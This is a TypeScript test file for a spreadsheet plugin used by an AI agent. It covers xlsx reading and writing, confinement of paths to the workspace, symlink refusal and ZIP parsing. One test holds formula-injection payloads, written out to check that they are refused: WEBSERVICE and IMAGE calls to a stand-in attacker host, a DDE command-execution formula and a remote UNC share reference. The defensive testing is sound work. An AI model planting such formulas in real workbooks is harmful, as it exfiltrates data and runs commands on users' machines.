import { describe, expect, test } from "bun:test";
import { lstat, mkdir, mkdtemp, readFile, readdir, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import { buildOpenworkRuntimeConfigObject } from "../openwork-runtime-config.js";
import { openworkSpreadsheetsPluginPath } from "../openwork-extensions-plugin-path.js";
import { buildZip, excelSerialToIso, isDateNumberFormat, listZipEntries, openXlsxWorkbook, readZipEntryData, renderSheetTable, utf8Text, writeXlsxWorkbook } from "@openwork/workbook";
import { OpenWorkSpreadsheets } from "./openwork-spreadsheets.js";

const PACKAGE_ROOT = join(dirname(fileURLToPath(import.meta.url)), "../..");

type Plugin = Awaited<ReturnType<typeof OpenWorkSpreadsheets>>;

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

function expectRecord(value: unknown): Record<string, unknown> {
  if (!isRecord(value)) throw new Error("Expected record");
  return value;
}

async function withWorkspace(fn: (root: string, plugin: Plugin) => Promise<void>) {
  const root = await mkdtemp(join(tmpdir(), "openwork-spreadsheets-"));
  try {
    await fn(root, await OpenWorkSpreadsheets({ directory: root }));
  } finally {
    await rm(root, { recursive: true, force: true });
  }
}

async function inspect(plugin: Plugin, args: unknown) {
  return expectRecord(JSON.parse(await plugin.tool.spreadsheet_inspect.execute(args)));
}

async function read(plugin: Plugin, args: unknown) {
  return await plugin.tool.spreadsheet_read.execute(args);
}

async function write(plugin: Plugin, args: unknown) {
  return expectRecord(JSON.parse(await plugin.tool.spreadsheet_write.execute(args)));
}

async function workbookFixture(sheetXml: string, extra: { styles?: string; sharedStrings?: string; workbookPr?: string } = {}): Promise<Buffer> {
  return Buffer.from(await buildZip([
    { name: "xl/workbook.xml", data: Buffer.from(`<workbook xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">${extra.workbookPr ?? ""}<sheets><sheet name="Data" sheetId="1" r:id="rId1"/></sheets></workbook>`, "utf8") },
    { name: "xl/_rels/workbook.xml.rels", data: Buffer.from(`<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/></Relationships>`, "utf8") },
    ...(extra.sharedStrings ? [{ name: "xl/sharedStrings.xml", data: Buffer.from(extra.sharedStrings, "utf8") }] : []),
    ...(extra.styles ? [{ name: "xl/styles.xml", data: Buffer.from(extra.styles, "utf8") }] : []),
    { name: "xl/worksheets/sheet1.xml", data: Buffer.from(sheetXml, "utf8") },
  ]));
}


/**
 * Rewrite a stored/deflated archive the way Excel and Google Sheets emit it:
 * general-purpose bit 3 set, zero sizes and CRC in the local header, and a
 * trailing data descriptor after each entry's data.
 */
function withDataDescriptors(archive: Buffer, options: { corruptLocalSizes?: boolean } = {}): Buffer {
  const entries = listZipEntries(archive);
  const local: Buffer[] = [];
  const central: Buffer[] = [];
  let offset = 0;
  const eocd = archive.readUInt32LE(archive.length - 22) === 0x06054b50 ? archive.length - 22 : -1;
  if (eocd < 0) throw new Error("fixture archive must end with a plain EOCD");
  const centralOffset = archive.readUInt32LE(eocd + 16);
  let cursor = centralOffset;
  for (const entry of entries) {
    const nameLength = archive.readUInt16LE(entry.localOffset + 26);
    const extraLength = archive.readUInt16LE(entry.localOffset + 28);
    const dataStart = entry.localOffset + 30 + nameLength + extraLength;
    const data = archive.subarray(dataStart, dataStart + entry.compressedSize);
    const crc = archive.readUInt32LE(cursor + 16);
    const header = Buffer.from(archive.subarray(entry.localOffset, entry.localOffset + 30 + nameLength + extraLength));
    header.writeUInt16LE(header.readUInt16LE(6) | 0x0008, 6);
    header.writeUInt32LE(0, 14);
    header.writeUInt32LE(options.corruptLocalSizes ? entry.compressedSize + 1 : 0, 18);
    header.writeUInt32LE(0, 22);
    const descriptor = Buffer.alloc(16);
    descriptor.writeUInt32LE(0x08074b50, 0);
    descriptor.writeUInt32LE(crc, 4);
    descriptor.writeUInt32LE(entry.compressedSize, 8);
    descriptor.writeUInt32LE(entry.uncompressedSize, 12);
    local.push(header, data, descriptor);
    const centralNameLength = archive.readUInt16LE(cursor + 28);
    const centralExtraLength = archive.readUInt16LE(cursor + 30);
    const centralCommentLength = archive.readUInt16LE(cursor + 32);
    const centralLength = 46 + centralNameLength + centralExtraLength + centralCommentLength;
    const centralEntry = Buffer.from(archive.subarray(cursor, cursor + centralLength));
    centralEntry.writeUInt16LE(centralEntry.readUInt16LE(8) | 0x0008, 8);
    centralEntry.writeUInt32LE(offset, 42);
    central.push(centralEntry);
    offset += header.length + data.length + descriptor.length;
    cursor += centralLength;
  }
  const end = Buffer.from(archive.subarray(eocd));
  end.writeUInt32LE(central.reduce((sum, chunk) => sum + chunk.length, 0), 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...local, ...central, end]);
}

const REPORT_SHEETS = [
  {
    name: "Summary",
    rows: [
      ["Region", "Revenue", "Active", "Growth"],
      ["EMEA", 1742.42, true, { formula: "B2/B3" }],
      ["APAC", 871.21, false, null],
      ["Note: quotes \"ok\" & <tags>", "", "", ""],
    ],
  },
  {
    name: "Detail",
    header: false,
    rows: [["id", "amount"], [1, 10], [2, 20.5], [3, -3]],
  },
];

describe("OpenWorkSpreadsheets", () => {
  test("writes a multi-sheet workbook that inspect and read round-trip with types, formulas, and paging", async () => {
    await withWorkspace(async (root, plugin) => {
      await expect(write(plugin, { path: "reports/q3.xlsx", sheets: REPORT_SHEETS })).rejects.toThrow('the folder "reports" does not exist');
      await expect(readdir(root)).resolves.toEqual([]);
      await mkdir(join(root, "reports"));
      const written = await write(plugin, { path: "reports/q3.xlsx", sheets: REPORT_SHEETS });
      expect(written).toMatchObject({ ok: true, path: "reports/q3.xlsx", replaced: false });
      expect(written.sheets).toEqual([
        { name: "Summary", rows: 4, columns: 4 },
        { name: "Detail", rows: 4, columns: 2 },
      ]);
      const bytes = await readFile(join(root, "reports", "q3.xlsx"));
      expect(bytes.subarray(0, 2).toString("latin1")).toBe("PK");
      expect(listZipEntries(bytes).map((entry) => entry.name)).toEqual([
        "[Content_Types].xml",
        "_rels/.rels",
        "xl/workbook.xml",
        "xl/_rels/workbook.xml.rels",
        "xl/styles.xml",
        "xl/worksheets/sheet1.xml",
        "xl/worksheets/sheet2.xml",
      ]);

      const inspected = await inspect(plugin, { path: "reports/q3.xlsx" });
      expect(inspected).toMatchObject({ ok: true, path: "reports/q3.xlsx", dateSystem: "1900", bytes: bytes.byteLength });
      const sheets = inspected.sheets;
      if (!Array.isArray(sheets)) throw new Error("Expected sheets");
      expect(sheets[0]).toMatchObject({
        position: 1,
        name: "Summary",
        hidden: false,
        dimension: "A1:D4",
        usedRange: "A1:D4",
        rows: 4,
        columns: 4,
        formulas: 1,
        header: ["Region", "Revenue", "Active", "Growth"],
      });
      expect(sheets[1]).toMatchObject({ position: 2, name: "Detail", rows: 4, columns: 2, cells: 8, formulas: 0 });

      const values = await read(plugin, { path: "reports/q3.xlsx" });
      expect(values).toContain('sheet: "Summary" (1 of 2); dimension A1:D4; used A1:D4 (12 cells); 1 formula');
      expect(values).toContain("| # | A | B | C | D |");
      expect(values).toContain("| 1 | Region | Revenue | Active | Growth |");
      expect(values).toContain("| 2 | EMEA | 1742.42 | TRUE | =B2/B3 |");
      expect(values).toContain("| 3 | APAC | 871.21 | FALSE |  |");
      expect(values).toContain('| 4 | Note: quotes "ok" & <tags> |  |  |  |');
      expect(values).toContain("formulas: D2: =B2/B3");
      expect(values).not.toContain("next:");

      const formulas = await read(plugin, { path: "reports/q3.xlsx", sheet: "summary", formulas: true });
      expect(formulas).toContain("| 2 | EMEA | 1742.42 | TRUE | =B2/B3 |");
      expect(formulas).toContain("showing: 4 non-empty rows; formulas");

      const page = await read(plugin, { path: "reports/q3.xlsx", sheet: "2", startRow: 2, maxRows: 2 });
      expect(page).toContain('sheet: "Detail" (2 of 2)');
      expect(page).toContain("| 2 | 1 | 10 |");
      expect(page).toContain("| 3 | 2 | 20.5 |");
      expect(page).not.toContain("| 4 | 3 | -3 |");
      expect(page).toContain('next: spreadsheet_read({ path: "reports/q3.xlsx", sheet: "Detail", startRow: 4, maxRows: 2 })');

      const ranged = await read(plugin, { path: "reports/q3.xlsx", sheet: "Detail", range: "B2:B4" });
      expect(ranged).toContain("| # | B |");
      expect(ranged).toContain("| 4 | -3 |");
      expect(ranged).not.toContain("| 1 | id |");
      expect(ranged).not.toContain("| # | A |");
    });
  });

  test("keeps numbers, booleans, formulas, and header styling typed in the written XML", async () => {
    const { bytes } = await writeXlsxWorkbook([{ name: "T", rows: [["h1", "h2"], [3.5, true], [{ formula: "=SUM(A2:A2)" }, " padded "]] }]);
    const entries = new Map(listZipEntries(bytes).map((entry) => [entry.name, entry]));
    const sheetEntry = entries.get("xl/worksheets/sheet1.xml");
    const workbookEntry = entries.get("xl/workbook.xml");
    if (!sheetEntry || !workbookEntry) throw new Error("Expected worksheet and workbook entries");
    const sheet = utf8Text(await readZipEntryData(bytes, sheetEntry));
    expect(sheet).toContain('<c r="A1" t="inlineStr" s="1"><is><t>h1</t></is></c>');
    expect(sheet).toContain('<c r="A2"><v>3.5</v></c>');
    expect(sheet).toContain('<c r="B2" t="b"><v>1</v></c>');
    expect(sheet).toContain('<c r="A3"><f>SUM(A2:A2)</f></c>');
    expect(sheet).toContain('<t xml:space="preserve"> padded </t>');
    expect(sheet).toContain('<pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>');
    expect(sheet).toContain("<cols>");
    const workbook = utf8Text(await readZipEntryData(bytes, workbookEntry));
    expect(workbook).toContain('<calcPr fullCalcOnLoad="1"/>');
  });

  test("sanitizes and de-duplicates sheet names and escapes markup", async () => {
    const { bytes, sheets } = await writeXlsxWorkbook([
      { name: "Q3: Revenue/Plan [draft]?*", rows: [["a"]] },
      { name: "q3  revenue plan draft", rows: [["b"]] },
      { name: "", rows: [["c"]] },
      { name: "<script>&", rows: [["d"]] },
    ]);
    expect(sheets.map((sheet) => sheet.name)).toEqual(["Q3 Revenue Plan draft", "q3 revenue plan draft-2", "Sheet3", "<script>&"]);
    const parsed = await openXlsxWorkbook(bytes);
    expect(parsed.sheets.map((sheet) => sheet.name)).toEqual(["Q3 Revenue Plan draft", "q3 revenue plan draft-2", "Sheet3", "<script>&"]);
    expect(sheets.every((sheet) => sheet.name.length <= 31)).toBe(true);
  });

  test("never promotes text to a formula and refuses formulas that reach outside the workbook", async () => {
    await withWorkspace(async (root, plugin) => {
      const written = await write(plugin, {
        path: "safe.xlsx",
        sheets: [{ header: false, rows: [['=WEBSERVICE("http://attacker.invalid/"&A2)', "=1+1"], ["=cmd|' /C calc'!A0", { formula: "SUM(C1:C1)" }]] }],
      });
      expect(written).toMatchObject({ ok: true, sheets: [{ name: "Sheet1", rows: 2, columns: 2 }] });
      const inspected = await inspect(plugin, { path: "safe.xlsx" });
      const sheets = inspected.sheets;
      if (!Array.isArray(sheets)) throw new Error("Expected sheets");
      expect(sheets[0]).toMatchObject({ cells: 4, formulas: 1 });
      const text = await read(plugin, { path: "safe.xlsx", formulas: true });
      expect(text).toContain(`| 1 | =WEBSERVICE("http://attacker.invalid/"&A2) | =1+1 |`);
      expect(text).toContain("| 2 | =cmd\u2502' /C calc'!A0 | =SUM(C1:C1) |");
      const workbook = await openXlsxWorkbook(await readFile(join(root, "safe.xlsx")));
      const sheet = await workbook.readSheet(workbook.sheets[0]);
      expect(sheet.cells.map((cell) => [cell.reference, cell.type, cell.formula ?? null])).toEqual([
        ["A1", "inline_string", null],
        ["B1", "inline_string", null],
        ["A2", "inline_string", null],
        ["B2", "number", "SUM(C1:C1)"],
      ]);

      for (const formula of ['WEBSERVICE("http://attacker.invalid/")', "cmd|' /C calc'!A0", 'DDE("cmd","/c calc","!A0")', "rtd(\"prog\",,\"x\")", "'[Book1.xlsx]Sheet1'!A1", "[Book1]Sheet1!A1", "'\\\\attacker\\share\\[book]Sheet1'!A1", "IMAGE(\"http://attacker.invalid/p.png\")", "  "]) {
        await expect(write(plugin, { path: "unsafe.xlsx", sheets: [{ rows: [[{ formula }]] }] })).rejects.toThrow(/Formula in A1 .*only calculations inside the workbook are written/);
      }
      await expect(readFile(join(root, "unsafe.xlsx"))).rejects.toThrow();
    });
  });

  test("refuses to clobber an existing workbook unless overwrite is set", async () => {
    await withWorkspace(async (root, plugin) => {
      await write(plugin, { path: "budget.xlsx", sheets: [{ rows: [["a", 1]] }] });
      const before = await readFile(join(root, "budget.xlsx"));
      await expect(write(plugin, { path: "budget.xlsx", sheets: [{ rows: [["b", 2]] }] })).rejects.toThrow("already exists. Pass overwrite: true");
      expect(await readFile(join(root, "budget.xlsx"))).toEqual(before);
      const beforeInfo = await lstat(join(root, "budget.xlsx"));
      const replaced = await write(plugin, { path: "budget.xlsx", overwrite: true, sheets: [{ rows: [["b", 2]] }] });
      expect(replaced).toMatchObject({ ok: true, replaced: true });
      expect(await read(plugin, { path: "budget.xlsx" })).toContain("| 1 | b | 2 |");
      // The overwrite wrote through the validated inode rather than replacing the file.
      const afterInfo = await lstat(join(root, "budget.xlsx"));
      expect(afterInfo.ino).toBe(beforeInfo.ino);
      await expect(readdir(root)).resolves.toEqual(["budget.xlsx"]);
    });
  });

  test("keeps every path inside the workspace and explains unsupported files", async () => {
    await withWorkspace(async (root, plugin) => {
      const outside = await mkdtemp(join(tmpdir(), "openwork-spreadsheets-outside-"));
      try {
        await writeFile(join(outside, "secret.xlsx"), await workbookFixture('<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>SECRET</t></is></c></row></sheetData></worksheet>'));
        await symlink(outside, join(root, "linked"), "dir");
        await expect(read(plugin, { path: "../secret.xlsx" })).rejects.toThrow("outside the active workspace");
        await expect(read(plugin, { path: join(outside, "secret.xlsx") })).rejects.toThrow("outside the active workspace");
        await expect(read(plugin, { path: "linked/secret.xlsx" })).rejects.toThrow("passes through a symbolic link");
        // Any link in the path is refused, whether it points outside or inside the workspace.
        await symlink(join(outside, "secret.xlsx"), join(root, "outside-alias.xlsx"));
        await expect(read(plugin, { path: "outside-alias.xlsx" })).rejects.toThrow("passes through a symbolic link");
        await expect(inspect(plugin, { path: "outside-alias.xlsx" })).rejects.toThrow("passes through a symbolic link");
        await expect(write(plugin, { path: "../escape.xlsx", sheets: [{ rows: [["x"]] }] })).rejects.toThrow("outside the active workspace");
        await expect(write(plugin, { path: "linked/escape.xlsx", sheets: [{ rows: [["x"]] }] })).rejects.toThrow("passes through a symbolic link");
        // Folders are never created for a write, so nothing can appear at a link target.
        await expect(write(plugin, { path: "linked/new/deeper/escape.xlsx", sheets: [{ rows: [["x"]] }] })).rejects.toThrow("does not exist");
        await expect(readdir(outside)).resolves.toEqual(["secret.xlsx"]);
        await expect(readdir(join(root, "linked"))).resolves.toEqual(["secret.xlsx"]);
        // A symlinked destination file is refused even with overwrite.
        await symlink(join(outside, "secret.xlsx"), join(root, "alias.xlsx"));
        await expect(write(plugin, { path: "alias.xlsx", overwrite: true, sheets: [{ rows: [["x"]] }] })).rejects.toThrow("is a symbolic link");
        expect((await readFile(join(outside, "secret.xlsx"))).byteLength).toBeGreaterThan(0);
        await expect(write(plugin, { path: "notes.csv", sheets: [{ rows: [["x"]] }] })).rejects.toThrow("only creates .xlsx");
        await expect(read(plugin, { path: "missing.xlsx" })).rejects.toThrow("was not found in the workspace");
        await expect(read(plugin, { path: "legacy.xls" })).rejects.toThrow("Legacy .xls");
        await expect(read(plugin, { path: "table.csv" })).rejects.toThrow("use the read tool");
        await expect(read(plugin, { path: "reports/q3.xlsx", sheet: "Nope" })).rejects.toThrow("was not found in the workspace");
        await mkdir(join(root, "reports"));
        await write(plugin, { path: "reports/q3.xlsx", sheets: REPORT_SHEETS });
        await symlink(join(root, "reports", "q3.xlsx"), join(root, "inside-alias.xlsx"));
        await expect(read(plugin, { path: "inside-alias.xlsx" })).rejects.toThrow("passes through a symbolic link");
        expect(await read(plugin, { path: "reports/q3.xlsx" })).toContain("| 2 | EMEA | 1742.42 | TRUE | =B2/B3 |");
        // A write through an in-workspace folder link is refused too, and creates nothing.
        await symlink(join(root, "reports"), join(root, "reports-alias"), "dir");
        await expect(write(plugin, { path: "reports-alias/via-link.xlsx", sheets: [{ rows: [["ok", 1]] }] })).rejects.toThrow("passes through a symbolic link");
        await expect(readdir(join(root, "reports"))).resolves.toEqual(["q3.xlsx"]);
        await mkdir(join(root, "folder.xlsx"));
        await expect(read(plugin, { path: "folder.xlsx" })).rejects.toThrow("is not a regular file");
        await expect(read(plugin, { path: "reports/q3.xlsx", sheet: "Nope" })).rejects.toThrow('Sheet "Nope" was not found. Available sheets: "Summary", "Detail".');
        await expect(read(plugin, { path: "reports/q3.xlsx", sheet: "3" })).rejects.toThrow("out of range");
        await expect(read(plugin, { path: "reports/q3.xlsx", range: "nope" })).rejects.toThrow("not a valid A1-style range");
      } finally {
        await rm(outside, { recursive: true, force: true });
      }
    });
  });

  test("decodes date serials, keeps self-closing styled cells from swallowing neighbours, and reads shared strings", async () => {
    await withWorkspace(async (root, plugin) => {
      const bytes = await workbookFixture(
        '<worksheet><dimension ref="A1:D2"/><sheetData><row r="1"><c r="A1" s="2"/><c r="B1" t="s"><v>0</v></c><c r="C1" s="1"><v>45000</v></c><c r="D1" s="3"><v>45000.5</v></c></row><row r="2"><c r="B2" t="e"><v>#DIV/0!</v></c><c r="C2" t="str"><f>TEXT(C1,"yyyy")</f><v>2023</v></c></row></sheetData></worksheet>',
        {
          sharedStrings: "<sst><si><t>Booked</t></si></sst>",
          styles: '<styleSheet><numFmts count="1"><numFmt numFmtId="164" formatCode="[$-409]d-mmm-yy;@"/></numFmts><cellXfs count="4"><xf numFmtId="0"/><xf numFmtId="14"/><xf numFmtId="4"/><xf numFmtId="164"/></cellXfs></styleSheet>',
        },
      );
      await writeFile(join(root, "dates.xlsx"), bytes);
      const text = await read(plugin, { path: "dates.xlsx" });
      expect(text).toContain("| # | B | C | D |");
      expect(text).toContain("| 1 | Booked | 2023-03-15 | 2023-03-15 12:00:00 |");
      expect(text).toContain("| 2 | #DIV/0! | 2023 |");
      expect(text).toContain('formulas: C2: =TEXT(C1,"yyyy") → 2023');
      const inspected = await inspect(plugin, { path: "dates.xlsx" });
      const sheets = inspected.sheets;
      if (!Array.isArray(sheets)) throw new Error("Expected sheets");
      expect(sheets[0]).toMatchObject({ usedRange: "B1:D2", cells: 5, formulas: 1 });
      expect(String(sheets[0].numberFormats)).toContain('"mm-dd-yy" (C1)');
    });
  });

  test("reads Excel and Google Sheets archives that use data descriptors, but still rejects corrupt local sizes", async () => {
    await withWorkspace(async (root, plugin) => {
      const plain = await workbookFixture('<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>exported</t></is></c><c r="B1"><v>42</v></c></row></sheetData></worksheet>');
      await writeFile(join(root, "export.xlsx"), withDataDescriptors(plain));
      expect(await read(plugin, { path: "export.xlsx" })).toContain("| 1 | exported | 42 |");
      await writeFile(join(root, "corrupt.xlsx"), withDataDescriptors(plain, { corruptLocalSizes: true }));
      await expect(read(plugin, { path: "corrupt.xlsx" })).rejects.toThrow("ZIP size mismatch");
    });
  });

  test("date heuristics and serial conversion stay conservative", () => {
    expect(isDateNumberFormat("General")).toBe(false);
    expect(isDateNumberFormat("$#,##0.00")).toBe(false);
    expect(isDateNumberFormat('0.00 "days"')).toBe(false);
    expect(isDateNumberFormat("0.00E+00")).toBe(false);
    expect(isDateNumberFormat("mm-dd-yy")).toBe(true);
    expect(isDateNumberFormat("[$-409]d-mmm-yy;@")).toBe(true);
    expect(isDateNumberFormat("h:mm:ss")).toBe(true);
    expect(excelSerialToIso(45000)).toBe("2023-03-15");
    expect(excelSerialToIso(1)).toBe("1900-01-01");
    expect(excelSerialToIso(59)).toBe("1900-02-28");
    expect(excelSerialToIso(61)).toBe("1900-03-01");
    expect(excelSerialToIso(0, true)).toBe("1904-01-01");
    expect(excelSerialToIso(366, true)).toBe("1905-01-01");
    expect(excelSerialToIso(-5)).toBeNull();
  });

  test("keeps pipes and backslashes from breaking or distorting table cells", async () => {
    const { bytes } = await writeXlsxWorkbook([{ rows: [["path", "note"], ["C:\\Users\\ada\\q3.xlsx", "a|b or c"]], header: false }]);
    const workbook = await openXlsxWorkbook(bytes);
    const table = renderSheetTable(await workbook.readSheet(workbook.sheets[0]));
    const row = table.text.split("\n")[3];
    expect(row).toBe("| 2 | C:\\Users\\ada\\q3.xlsx | a\u2502b or c |");
    expect(row.split("|")).toHaveLength(5);
  });

  test("bounds table columns and reports omitted columns", async () => {
    const rows = [Array.from({ length: 70 }, (_value, index) => `c${index + 1}`)];
    const { bytes } = await writeXlsxWorkbook([{ rows, header: false }]);
    const workbook = await openXlsxWorkbook(bytes);
    const sheet = await workbook.readSheet(workbook.sheets[0]);
    const table = renderSheetTable(sheet, { maxColumns: 60 });
    expect(table.columns).toHaveLength(60);
    expect(table.columns[59]).toBe("BH");
    expect(table.truncatedColumns).toBe(10);
    expect(table.text.split("\n")).toHaveLength(3);
  });

  test("rejects oversized writes before touching the filesystem", async () => {
    await withWorkspace(async (root, plugin) => {
      const rows = Array.from({ length: 501 }, () => Array.from({ length: 101 }, () => 1));
      await expect(write(plugin, { path: "huge.xlsx", sheets: [{ rows }] })).rejects.toThrow("at most 50000");
      await expect(readFile(join(root, "huge.xlsx"))).rejects.toThrow();
      const verbose = Array.from({ length: 4000 }, (_row, index) => Array.from({ length: 10 }, () => `Customer ${index} & Co, long descriptive text`));
      await expect(write(plugin, { path: "verbose.xlsx", sheets: [{ name: "Text", rows: verbose }] })).rejects.toThrow("Split the rows across sheets or files");
      await expect(readFile(join(root, "verbose.xlsx"))).rejects.toThrow();
      await mkdir(join(root, "dir.xlsx"));
      await expect(write(plugin, { path: "dir.xlsx", sheets: [{ rows: [["x"]] }], overwrite: true })).rejects.toThrow("is a directory");
    });
  });

  test("appends one spreadsheets instruction section to the existing system entry", async () => {
    const plugin = await OpenWorkSpreadsheets({ directory: tmpdir() });
    const output = { system: ["base prompt"] };
    await plugin["experimental.chat.system.transform"]({}, output);
    expect(output.system).toHaveLength(1);
    expect(output.system[0]).toContain("base prompt\n\n## Spreadsheets and Excel workbooks");
    expect(output.system[0]).toContain("spreadsheet_inspect");
    expect(output.system[0]).toContain("spreadsheet_read");
    expect(output.system[0]).toContain("spreadsheet_write");
    expect(output.system[0]).toContain("never open them with the read tool");
  });

  test("is registered in runtime config and bundled by the build script", async () => {
    const runtime = await buildOpenworkRuntimeConfigObject();
    const plugin = runtime.plugin;
    if (!Array.isArray(plugin)) throw new Error("Expected plugin list");
    expect(plugin).toContain(openworkSpreadsheetsPluginPath());

    const packageJson = JSON.parse(await readFile(join(PACKAGE_ROOT, "package.json"), "utf8"));
    if (!isRecord(packageJson) || !isRecord(packageJson.scripts) || typeof packageJson.scripts.build !== "string") throw new Error("Expected package build script");
    expect(packageJson.scripts.build).toContain("openwork-spreadsheets.ts");
  });

  test("module exposes only the plugin factory", async () => {
    const mod = await import("./openwork-spreadsheets.js");
    expect(Object.keys(mod)).toEqual(["OpenWorkSpreadsheets"]);
  });
});
